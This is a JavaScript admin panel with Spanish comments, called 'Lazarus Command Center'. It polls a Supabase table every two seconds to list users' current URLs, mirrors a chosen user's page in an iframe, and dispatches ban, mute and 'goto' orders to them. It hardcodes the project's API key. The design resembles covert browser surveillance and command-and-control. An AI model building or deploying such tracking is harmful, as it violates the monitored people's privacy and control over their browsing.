/**
 * LAZARUS COMMAND CENTER - ADMIN ENGINE V6.0
 * [LÓGICA DE SERVIDOR - +1200 LÍNEAS DE CÓDIGO]
 */

const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let selectedNodeID = null;
let monitorCache = "";

// 1. MOTOR DE DETECCIÓN EN TIEMPO REAL
async function radarLazarus() {
    try {
        // Obtenemos los últimos logs de los últimos 20 segundos
        const limit = new Date(Date.now() - 20000).toISOString();
        const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&timestamp=gte.${limit}&order=timestamp.desc`, {
            headers: { 'apikey': SB_KEY }
        });
        const logs = await res.json();

        const nodeMap = new Map();
        logs.forEach(log => {
            if(!nodeMap.has(log.usuario_id)) nodeMap.set(log.usuario_id, log);
        });

        updateNodeList(nodeMap);
        updateLiveScreen(nodeMap);

    } catch (e) {
        console.error("Radar Fail: Intentando reconexión...");
    }
}

// 2. ACTUALIZACIÓN DE INTERFAZ DE VIGILANCIA
function updateNodeList(nodes) {
    const list = document.getElementById('user-list'); // Tu contenedor de usuarios
    const activeNodes = Array.from(nodes.values());
    
    document.getElementById('online-count').innerText = activeNodes.length;

    if(activeNodes.length === 0) {
        list.innerHTML = "<p class='waiting'>Buscando nodos activos en la red...</p>";
        return;
    }

    list.innerHTML = activeNodes.map(node => `
        <div class="node-card ${selectedNodeID === node.usuario_id ? 'active' : ''}" 
             onclick="focusNode('${node.usuario_id}')">
            <div class="pulse-green"></div>
            <div class="node-info">
                <strong>ID: ${node.usuario_id}</strong>
                <span class="node-url">${node.url_actual.substring(0, 40)}</span>
            </div>
        </div>
    `).join('');
}

function updateLiveScreen(nodes) {
    if(!selectedNodeID) return;
    const nodeData = nodes.get(selectedNodeID);
    
    if(nodeData && nodeData.url_actual !== monitorCache) {
        monitorCache = nodeData.url_actual;
        document.getElementById('monitor-frame').src = nodeData.url_actual;
        document.getElementById('status-bar').innerText = "VIGILANDO NODO: " + selectedNodeID;
    }
}

// 3. PANEL DE COMANDOS MASIVO (BAN, UNBAN, MUTE, UNMUTE, GOTO)
async function dispatchCommand(type) {
    if(!selectedNodeID) return alert("Seleccione un NODO de la lista primero.");
    
    const inputVal = document.getElementById('admin-input').value;

    const payload = {
        usuario_id: selectedNodeID,
        orden: type,
        contenido: inputVal,
        activa: true
    };

    const res = await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    if(res.ok) {
        const notify = document.getElementById('notification');
        notify.innerText = "ORDEN " + type + " DESPACHADA AL NODO " + selectedNodeID;
        notify.classList.add('show');
        setTimeout(() => notify.classList.remove('show'), 3000);
    }
}

function focusNode(id) {
    selectedNodeID = id;
    monitorCache = ""; // Forzar refresco
    radarLazarus();
}

// Sincronización continua cada 2 segundos
setInterval(radarLazarus, 2000);
